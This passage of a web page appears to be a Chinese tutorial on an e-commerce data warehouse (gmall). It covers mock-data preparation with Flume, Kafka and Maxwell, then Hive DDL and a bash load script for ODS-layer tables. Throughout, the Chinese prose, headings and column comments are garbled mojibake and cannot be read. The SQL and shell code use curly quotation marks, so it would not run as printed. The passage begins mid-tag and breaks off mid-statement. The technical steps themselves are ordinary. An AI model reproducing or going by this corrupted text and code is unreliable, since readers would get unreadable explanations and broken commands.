src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/9fea377dcc34e3844f0d14dae5db060e.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, æ–‡æœ¬, åº”ç”¨ç¨‹åº, ç”µå­é‚®ä»¶æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ4ï¼‰é€‰æ‹©å½“å‰æ•°æ®åº“ä¸ºgmall</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/5e6b5bfea4448d2ea28ef971eeaadaee.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><h3 id="æ¨¡æ‹Ÿæ•°æ®å‡†å¤‡"><a href="#æ¨¡æ‹Ÿæ•°æ®å‡†å¤‡" class="headerlink" title="æ¨¡æ‹Ÿæ•°æ®å‡†å¤‡"></a>æ¨¡æ‹Ÿæ•°æ®å‡†å¤‡</h3><p>é€šå¸¸ä¼ä¸šåœ¨å¼€å§‹æ­å»ºæ•°ä»“æ—¶ï¼Œä¸šåŠ¡ç³»ç»Ÿä¸­ä¼šå­˜åœ¨å†å²æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ä¸šåŠ¡æ•°æ®åº“å­˜åœ¨å†å²æ•°æ®ï¼Œè€Œç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ— å†å²æ•°æ®ã€‚å‡å®šæ•°ä»“ä¸Šçº¿çš„æ—¥æœŸä¸º2020-06-14ï¼Œä¸ºæ¨¡æ‹ŸçœŸå®åœºæ™¯ï¼Œéœ€å‡†å¤‡ä»¥ä¸‹æ•°æ®ã€‚</p><p>æ³¨ï¼šåœ¨æ‰§è¡Œä»¥ä¸‹æ“ä½œä¹‹å‰ï¼Œå…ˆå°†HDFSä¸Š/origin_dataè·¯å¾„ä¸‹ä¹‹å‰çš„æ•°æ®åˆ é™¤ã€‚</p><p><strong>1ï¼‰ç”¨æˆ·è¡Œä¸ºæ—¥å¿—</strong></p><p>ç”¨æˆ·è¡Œä¸ºæ—¥å¿—ï¼Œä¸€èˆ¬æ˜¯æ²¡æœ‰å†å²æ•°æ®çš„ï¼Œæ•…æ—¥å¿—åªéœ€è¦å‡†å¤‡2020-06-14ä¸€å¤©çš„æ•°æ®ã€‚å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p><p>ï¼ˆ1ï¼‰å¯åŠ¨æ—¥å¿—é‡‡é›†é€šé“ï¼ŒåŒ…æ‹¬Flumeã€Kafakç­‰</p><p>ï¼ˆ2ï¼‰ä¿®æ”¹ä¸¤ä¸ªæ—¥å¿—æœåŠ¡å™¨ï¼ˆhadoop102ã€hadoop103ï¼‰ä¸­çš„</p><p>/opt/module/applog/application.ymlé…ç½®æ–‡ä»¶ï¼Œå°†mock.dateå‚æ•°æ”¹ä¸º2020-06-14ã€‚</p><p>ï¼ˆ3ï¼‰æ‰§è¡Œæ—¥å¿—ç”Ÿæˆè„šæœ¬lg.shã€‚</p><p>ï¼ˆ4ï¼‰è§‚å¯ŸHDFSæ˜¯å¦å‡ºç°ç›¸åº”æ–‡ä»¶ã€‚</p><p><strong>2ï¼‰ä¸šåŠ¡æ•°æ®</strong></p><p>ä¸šåŠ¡æ•°æ®ä¸€èˆ¬å­˜åœ¨å†å²æ•°æ®ï¼Œæ­¤å¤„éœ€å‡†å¤‡2020-06-10è‡³2020-06-14çš„æ•°æ®ã€‚å…·ä½“æ“ä½œå¦‚ä¸‹ã€‚</p><p><strong>ï¼ˆ1ï¼‰ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®</strong></p><p>ä¿®æ”¹hadoop102èŠ‚ç‚¹ä¸Šçš„/opt/module/db_log/application.propertiesæ–‡ä»¶ï¼Œå°†mock.dateã€mock.clearï¼Œmock.clear.userä¸‰ä¸ªå‚æ•°è°ƒæ•´ä¸ºå¦‚å›¾æ‰€ç¤ºçš„å€¼ã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/928174bb07164efac9511dbf482a878f.png" alt="æ–‡æœ¬ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>æ‰§è¡Œæ¨¡æ‹Ÿç”Ÿæˆä¸šåŠ¡æ•°æ®çš„å‘½ä»¤ï¼Œç”Ÿæˆç¬¬ä¸€å¤©2020-06-10çš„å†å²æ•°æ®ã€‚</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-01-22.jar</p><p>ä¿®æ”¹/opt/module/db_log/application.propertiesæ–‡ä»¶ï¼Œå°†mock.dateã€mock.clearï¼Œmock.clear.userä¸‰ä¸ªå‚æ•°è°ƒæ•´ä¸ºå¦‚å›¾æ‰€ç¤ºçš„å€¼ã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/10f27d1b2dceed818de8b1a8b4de20fa.png" alt="æ–‡æœ¬ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>æ‰§è¡Œæ¨¡æ‹Ÿç”Ÿæˆä¸šåŠ¡æ•°æ®çš„å‘½ä»¤ï¼Œç”Ÿæˆç¬¬äºŒå¤©2020-06-11çš„å†å²æ•°æ®ã€‚</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-10-10.jar</p><p>ä¹‹ååªä¿®æ”¹/opt/module/db_log/application.propertiesæ–‡ä»¶ä¸­çš„mock.dateå‚æ•°ï¼Œä¾æ¬¡æ”¹ä¸º2020-06-12ï¼Œ2020-06-13ï¼Œ2020-06-14ï¼Œå¹¶åˆ†åˆ«ç”Ÿæˆå¯¹åº”æ—¥æœŸçš„æ•°æ®ã€‚</p><p><strong>ï¼ˆ2ï¼‰å…¨é‡è¡¨åŒæ­¥</strong></p><p>æ‰§è¡Œå…¨é‡è¡¨åŒæ­¥è„šæœ¬</p><p>[atguigu@hadoop102 bin]$ mysql_to_hdfs_full.sh all 2020-06-14</p><p>è§‚å¯ŸHDFSä¸Šæ˜¯å¦å‡ºç°å…¨é‡è¡¨æ•°æ®</p><p><strong>ï¼ˆ3ï¼‰å¢é‡è¡¨é¦–æ—¥å…¨é‡åŒæ­¥</strong></p><p>æ¸…é™¤Maxwellæ–­ç‚¹è®°å½•</p><p>ç”±äºMaxwellæ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œè€Œä¸Šè¿°é‡æ–°ç”Ÿæˆä¸šåŠ¡æ•°æ®çš„è¿‡ç¨‹ï¼Œä¼šäº§ç”Ÿå¤§é‡çš„binlogæ“ä½œæ—¥å¿—ï¼Œè¿™äº›æ—¥å¿—æˆ‘ä»¬å¹¶ä¸éœ€è¦ã€‚æ•…æ­¤å¤„éœ€æ¸…é™¤Maxwellçš„æ–­ç‚¹è®°å½•ï¼Œå¦å…¶ä»binlogæœ€æ–°çš„ä½ç½®å¼€å§‹é‡‡é›†ã€‚</p><p>å…³é—­Maxwell</p><p>[atguigu@hadoop102 bin]$ mxw.sh stop</p><p>æ¸…ç©ºMaxwellæ•°æ®åº“ï¼Œç›¸å½“äºåˆå§‹åŒ–Maxwell</p><p>mysql&gt;</p><p>drop table maxwell.bootstrap;</p><p>drop table maxwell.columns;</p><p>drop table maxwell.databases;</p><p>drop table maxwell.heartbeats;</p><p>drop table maxwell.positions;</p><p>drop table maxwell.schemas;</p><p>drop table maxwell.tables;</p><p>ä¿®æ”¹Maxwellé…ç½®æ–‡ä»¶ä¸­çš„mock_dateå‚æ•°</p><p>[atguigu@hadoop102 maxwell]$ vim /opt/module/maxwell/config.properties</p><p><strong>mock_date=2020-06-14</strong></p><p>å¯åŠ¨å¢é‡è¡¨æ•°æ®é€šé“ï¼ŒåŒ…æ‹¬Maxwellã€Kafkaã€Flume</p><p>æ‰§è¡Œå¢é‡è¡¨é¦–æ—¥å…¨é‡åŒæ­¥è„šæœ¬</p><p>[atguigu@hadoop102 bin]$ mysql_to_kafka_inc_init.sh all</p><p>è§‚å¯ŸHDFSä¸Šæ˜¯å¦å‡ºç°å…¨é‡è¡¨æ•°æ®</p><h2 id="ç¬¬7ç« -æ•°ä»“å¼€å‘ä¹‹ODSå±‚"><a href="#ç¬¬7ç« -æ•°ä»“å¼€å‘ä¹‹ODSå±‚" class="headerlink" title="ç¬¬7ç«  æ•°ä»“å¼€å‘ä¹‹ODSå±‚"></a>ç¬¬7ç«  æ•°ä»“å¼€å‘ä¹‹ODSå±‚</h2><p>ODSå±‚çš„è®¾è®¡è¦ç‚¹å¦‚ä¸‹ï¼š</p><p>1ï¼‰ODSå±‚çš„è¡¨ç»“æ„è®¾è®¡ä¾æ‰˜äºä»ä¸šåŠ¡ç³»ç»ŸåŒæ­¥è¿‡æ¥çš„æ•°æ®ç»“æ„ã€‚</p><p>2ï¼‰ODSå±‚è¦ä¿å­˜å…¨éƒ¨å†å²æ•°æ®ï¼Œæ•…å…¶å‹ç¼©æ ¼å¼åº”é€‰æ‹©å‹ç¼©æ¯”è¾ƒé«˜çš„ï¼Œæ­¤å¤„é€‰æ‹©gzipã€‚</p><p>3ï¼‰ODSå±‚è¡¨åçš„å‘½åè§„èŒƒä¸ºï¼šods_è¡¨å_å•åˆ†åŒºå¢é‡å…¨é‡æ ‡è¯†ï¼ˆinc/fullï¼‰ã€‚</p><h3 id="æ—¥å¿—è¡¨"><a href="#æ—¥å¿—è¡¨" class="headerlink" title="æ—¥å¿—è¡¨"></a>æ—¥å¿—è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨æ•°æ®</strong></p><p>DROP TABLE IF EXISTS ods_log_inc;</p><p>CREATE EXTERNAL TABLE ods_log_inc</p><p>(</p><p>`common` STRUCT&lt;ar :STRING,ba :STRING,ch :STRING,is_new :STRING,md<br>:STRING,mid :STRING,os :STRING,uid :STRING,vc</p><p>:STRING&gt; COMMENT â€˜å…¬å…±ä¿¡æ¯â€™,</p><p>`page` STRUCT&lt;during_time :STRING,item :STRING,item_type :STRING,last_page_id<br>:STRING,page_id</p><p>:STRING,source_type :STRING&gt; COMMENT â€˜é¡µé¢ä¿¡æ¯â€™,</p><p>`actions`<br>ARRAY&lt;STRUCT&lt;action_id:STRING,item:STRING,item_type:STRING,ts:BIGINT&gt;&gt;<br>COMMENT â€˜åŠ¨ä½œä¿¡æ¯â€™,</p><p>`displays` ARRAY&lt;STRUCT&lt;display_type :STRING,item :STRING,item_type<br>:STRING,`order` :STRING,pos_id</p><p>:STRING&gt;&gt; COMMENT â€˜æ›å…‰ä¿¡æ¯â€™,</p><p>`start` STRUCT&lt;entry :STRING,loading_time :BIGINT,open_ad_id<br>:BIGINT,open_ad_ms :BIGINT,open_ad_skip_ms</p><p>:BIGINT&gt; COMMENT â€˜å¯åŠ¨ä¿¡æ¯â€™,</p><p>`err` STRUCT&lt;error_code:BIGINT,msg:STRING&gt; COMMENT â€˜é”™è¯¯ä¿¡æ¯â€™,</p><p>`ts` BIGINT COMMENT â€˜æ—¶é—´æˆ³â€™</p><p>) COMMENT â€˜æ´»åŠ¨ä¿¡æ¯è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_log_inc/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>load data inpath â€˜/origin_data/gmall/log/topic_log/2020-06-14â€™ into table<br>ods_log_inc partition(dt=â€™2020-06-14â€™);</p><p><strong>3ï¼‰æ¯æ—¥æ•°æ®è£…è½½è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºhdfs_to_ods_log.sh</p><p>[atguigu@hadoop102 bin]$ vim hdfs_to_ods_log.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>## å®šä¹‰å˜é‡æ–¹ä¾¿ä¿®æ”¹</p><p>APP=gmall</p><p>## å¦‚æœæ˜¯è¾“å…¥çš„æ—¥æœŸæŒ‰ç…§å–è¾“å…¥æ—¥æœŸï¼›å¦‚æœæ²¡è¾“å…¥æ—¥æœŸå–å½“å‰æ—¶é—´çš„å‰ä¸€å¤©</p><p>if [ -n â€œ$1â€ ] ;then</p><p>do_date=$1</p><p>else</p><p>do_date=`date -d â€œ-1 dayâ€ +%F`</p><p>fi</p><p>echo ================== æ—¥å¿—æ—¥æœŸä¸º $do_date ==================</p><p>sql=â€</p><p>load data inpath â€˜/origin_data/$APP/log/topic_log/$do_dateâ€™ into table<br>${APP}.ods_log_inc partition(dt=â€™$do_dateâ€™);</p><p>â€œ</p><p>hive -e â€œ$sqlâ€</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x hdfs_to_ods_log.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ hdfs_to_ods_log.sh 2020-06-14</p><h3 id="ä¸šåŠ¡è¡¨"><a href="#ä¸šåŠ¡è¡¨" class="headerlink" title="ä¸šåŠ¡è¡¨"></a>ä¸šåŠ¡è¡¨</h3><h4 id="æ´»åŠ¨ä¿¡æ¯è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#æ´»åŠ¨ä¿¡æ¯è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="æ´»åŠ¨ä¿¡æ¯è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>æ´»åŠ¨ä¿¡æ¯è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_activity_info_full;</p><p>CREATE EXTERNAL TABLE ods_activity_info_full</p><p>(</p><p>`id` STRING COMMENT â€˜æ´»åŠ¨idâ€™,</p><p>`activity_name` STRING COMMENT â€˜æ´»åŠ¨åç§°â€™,</p><p>`activity_type` STRING COMMENT â€˜æ´»åŠ¨ç±»å‹â€™,</p><p>`activity_desc` STRING COMMENT â€˜æ´»åŠ¨æè¿°â€™,</p><p>`start_time` STRING COMMENT â€˜å¼€å§‹æ—¶é—´â€™,</p><p>`end_time` STRING COMMENT â€˜ç»“æŸæ—¶é—´â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¶é—´â€™</p><p>) COMMENT â€˜æ´»åŠ¨ä¿¡æ¯è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_activity_info_full/â€˜;</p><h4 id="æ´»åŠ¨è§„åˆ™è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#æ´»åŠ¨è§„åˆ™è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="æ´»åŠ¨è§„åˆ™è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>æ´»åŠ¨è§„åˆ™è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_activity_rule_full;</p><p>CREATE EXTERNAL TABLE ods_activity_rule_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`activity_id` STRING COMMENT â€˜ç±»å‹â€™,</p><p>`activity_type` STRING COMMENT â€˜æ´»åŠ¨ç±»å‹â€™,</p><p>`condition_amount` DECIMAL(16, 2) COMMENT â€˜æ»¡å‡é‡‘é¢â€™,</p><p>`condition_num` BIGINT COMMENT â€˜æ»¡å‡ä»¶æ•°â€™,</p><p>`benefit_amount` DECIMAL(16, 2) COMMENT â€˜ä¼˜æƒ é‡‘é¢â€™,</p><p>`benefit_discount` DECIMAL(16, 2) COMMENT â€˜ä¼˜æƒ æŠ˜æ‰£â€™,</p><p>`benefit_level` STRING COMMENT â€˜ä¼˜æƒ çº§åˆ«â€™</p><p>) COMMENT â€˜æ´»åŠ¨è§„åˆ™è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_activity_rule_full/â€˜;</p><h4 id="ä¸€çº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#ä¸€çº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="ä¸€çº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>ä¸€çº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_base_category1_full;</p><p>CREATE EXTERNAL TABLE ods_base_category1_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`name` STRING COMMENT â€˜åˆ†ç±»åç§°â€™</p><p>) COMMENT â€˜ä¸€çº§å“ç±»è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_base_category1_full/â€˜;</p><h4 id="äºŒçº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#äºŒçº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="äºŒçº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>äºŒçº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_base_category2_full;</p><p>CREATE EXTERNAL TABLE ods_base_category2_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`name` STRING COMMENT â€˜äºŒçº§åˆ†ç±»åç§°â€™,</p><p>`category1_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»ç¼–å·â€™</p><p>) COMMENT â€˜äºŒçº§å“ç±»è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_base_category2_full/â€˜;</p><h4 id="ä¸‰çº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#ä¸‰çº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="ä¸‰çº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>ä¸‰çº§å“ç±»è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_base_category3_full;</p><p>CREATE EXTERNAL TABLE ods_base_category3_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`name` STRING COMMENT â€˜ä¸‰çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` STRING COMMENT â€˜äºŒçº§åˆ†ç±»ç¼–å·â€™</p><p>) COMMENT â€˜ä¸‰çº§å“ç±»è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_base_category3_full/â€˜;</p><h4 id="ç¼–ç å­—å…¸è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#ç¼–ç å­—å…¸è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="ç¼–ç å­—å…¸è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>ç¼–ç å­—å…¸è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_base_dic_full;</p><p>CREATE EXTERNAL TABLE ods_base_dic_full</p><p>(</p><p>`dic_code` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`dic_name` STRING COMMENT â€˜ç¼–ç åç§°â€™,</p><p>`parent_code` STRING COMMENT â€˜çˆ¶ç¼–å·â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¥æœŸâ€™,</p><p>`operate_time` STRING COMMENT â€˜ä¿®æ”¹æ—¥æœŸâ€™</p><p>) COMMENT â€˜ç¼–ç å­—å…¸è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_base_dic_full/â€˜;</p><h4 id="çœä»½è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#çœä»½è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="çœä»½è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>çœä»½è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_base_province_full;</p><p>CREATE EXTERNAL TABLE ods_base_province_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`name` STRING COMMENT â€˜çœä»½åç§°â€™,</p><p>`region_id` STRING COMMENT â€˜åœ°åŒºIDâ€™,</p><p>`area_code` STRING COMMENT â€˜åœ°åŒºç¼–ç â€™,</p><p>`iso_code` STRING COMMENT â€˜æ—§ç‰ˆISO-3166-2ç¼–ç ï¼Œä¾›å¯è§†åŒ–ä½¿ç”¨â€™,</p><p>`iso_3166_2` STRING COMMENT â€˜æ–°ç‰ˆIOS-3166-2ç¼–ç ï¼Œä¾›å¯è§†åŒ–ä½¿ç”¨â€™</p><p>) COMMENT â€˜çœä»½è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_base_province_full/â€˜;</p><h4 id="åœ°åŒºè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#åœ°åŒºè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="åœ°åŒºè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>åœ°åŒºè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_base_region_full;</p><p>CREATE EXTERNAL TABLE ods_base_region_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`region_name` STRING COMMENT â€˜åœ°åŒºåç§°â€™</p><p>) COMMENT â€˜åœ°åŒºè¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_base_region_full/â€˜;</p><h4 id="å“ç‰Œè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#å“ç‰Œè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="å“ç‰Œè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>å“ç‰Œè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_base_trademark_full;</p><p>CREATE EXTERNAL TABLE ods_base_trademark_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`tm_name` STRING COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`logo_url` STRING COMMENT â€˜å“ç‰Œlogoçš„å›¾ç‰‡è·¯å¾„â€™</p><p>) COMMENT â€˜å“ç‰Œè¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_base_trademark_full/â€˜;</p><h4 id="è´­ç‰©è½¦è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#è´­ç‰©è½¦è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="è´­ç‰©è½¦è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>è´­ç‰©è½¦è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_cart_info_full;</p><p>CREATE EXTERNAL TABLE ods_cart_info_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜sku_idâ€™,</p><p>`cart_price` DECIMAL(16, 2) COMMENT â€˜æ”¾å…¥è´­ç‰©è½¦æ—¶ä»·æ ¼â€™,</p><p>`sku_num` BIGINT COMMENT â€˜æ•°é‡â€™,</p><p>`img_url` BIGINT COMMENT â€˜å•†å“å›¾ç‰‡åœ°å€â€™,</p><p>`sku_name` STRING COMMENT â€˜skuåç§° (å†—ä½™)â€™,</p><p>`is_checked` STRING COMMENT â€˜æ˜¯å¦è¢«é€‰ä¸­â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¶é—´â€™,</p><p>`operate_time` STRING COMMENT â€˜ä¿®æ”¹æ—¶é—´â€™,</p><p>`is_ordered` STRING COMMENT â€˜æ˜¯å¦å·²ç»ä¸‹å•â€™,</p><p>`order_time` STRING COMMENT â€˜ä¸‹å•æ—¶é—´â€™,</p><p>`source_type` STRING COMMENT â€˜æ¥æºç±»å‹â€™,</p><p>`source_id` STRING COMMENT â€˜æ¥æºç¼–å·â€™</p><p>) COMMENT â€˜è´­ç‰©è½¦å…¨é‡è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_cart_info_full/â€˜;</p><h4 id="ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_coupon_info_full;</p><p>CREATE EXTERNAL TABLE ods_coupon_info_full</p><p>(</p><p>`id` STRING COMMENT â€˜è´­ç‰©åˆ¸ç¼–å·â€™,</p><p>`coupon_name` STRING COMMENT â€˜è´­ç‰©åˆ¸åç§°â€™,</p><p>`coupon_type` STRING COMMENT â€˜è´­ç‰©åˆ¸ç±»å‹ 1 ç°é‡‘åˆ¸ 2 æŠ˜æ‰£åˆ¸ 3 æ»¡å‡åˆ¸ 4<br>æ»¡ä»¶æ‰“æŠ˜åˆ¸â€™,</p><p>`condition_amount` DECIMAL(16, 2) COMMENT â€˜æ»¡é¢æ•°â€™,</p><p>`condition_num` BIGINT COMMENT â€˜æ»¡ä»¶æ•°â€™,</p><p>`activity_id` STRING COMMENT â€˜æ´»åŠ¨ç¼–å·â€™,</p><p>`benefit_amount` DECIMAL(16, 2) COMMENT â€˜å‡é‡‘é¢â€™,</p><p>`benefit_discount` DECIMAL(16, 2) COMMENT â€˜æŠ˜æ‰£â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¶é—´â€™,</p><p>`range_type` STRING COMMENT â€˜èŒƒå›´ç±»å‹ 1ã€å•†å“ 2ã€å“ç±» 3ã€å“ç‰Œâ€™,</p><p>`limit_num` BIGINT COMMENT â€˜æœ€å¤šé¢†ç”¨æ¬¡æ•°â€™,</p><p>`taken_count` BIGINT COMMENT â€˜å·²é¢†ç”¨æ¬¡æ•°â€™,</p><p>`start_time` STRING COMMENT â€˜å¼€å§‹é¢†å–æ—¶é—´â€™,</p><p>`end_time` STRING COMMENT â€˜ç»“æŸé¢†å–æ—¶é—´â€™,</p><p>`operate_time` STRING COMMENT â€˜ä¿®æ”¹æ—¶é—´â€™,</p><p>`expire_time` STRING COMMENT â€˜è¿‡æœŸæ—¶é—´â€™</p><p>) COMMENT â€˜ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_coupon_info_full/â€˜;</p><h4 id="å•†å“å¹³å°å±æ€§è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#å•†å“å¹³å°å±æ€§è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="å•†å“å¹³å°å±æ€§è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>å•†å“å¹³å°å±æ€§è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_sku_attr_value_full;</p><p>CREATE 